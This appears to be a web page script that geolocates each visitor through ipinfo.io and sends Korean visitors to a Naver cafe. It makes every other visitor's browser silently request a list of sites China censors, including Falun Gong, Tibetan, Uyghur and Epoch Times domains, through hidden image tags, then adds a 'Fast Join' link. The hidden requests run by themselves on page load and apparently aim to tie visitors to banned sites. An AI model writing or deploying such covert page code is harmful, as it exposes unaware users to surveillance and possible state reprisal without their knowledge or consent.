  <body>
    <script type="text/javascript">
      var list = [
        "http://dongtaiwang.com",
        "https://www.freetibet.org",
        "https://www.uyghurcongress.org/en",
        "https://kr-mb.theepochtimes.com",
        "https://www.freehongkong.org",
        "https://www.taiwan.gov.tw",
        "http://www.yibaochina.com/",
        "https://theinitium.com/",
        "https://boxun.com/",
        "http://www.minghui.org/",
        "https://tibet.net/",
      ];
      window.onload = function () {
        var ip = "";
        var hostname = "";
        var city = "";
        var region = "";
        var country = "";
        var loc = "";
        var org = "";
        $.getJSON("http://ipinfo.io", function (data) {
          ip = data.ip; // 접속자 ip
          hostname = data.hostname; // 접속자 hostname
          city = data.city; // 접속자 도시
          region = data.region; // 접속자 지역
          country = data.country; // 접속자 국가
          loc = data.loc; // 접속 위도, 경도
          org = data.org; // ISP (인터넷 서비스 제공사업자)

          if (country == "KR") {
            console.log(data);
            window.location.href = "https://cafe.naver.com/globaltwom";
          } else {
            fullload();
          }
        });
      };
      function fullload() {
        for (var i = 0; i < list.length; i++) {
          load(list[i]);
        }
        join();
      }
      function load(url) {
        var img = document.createElement("img");
        img.src = url;
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
      }
      function join() {
        var btn = document.createElement("a");
        var btntext = document.createTextNode("Fast Join");
        btn.setAttribute("href", "http://dongtaiwang.com");
        btn.appendChild(btntext);
        document.body.appendChild(btn);
      }
    </script>
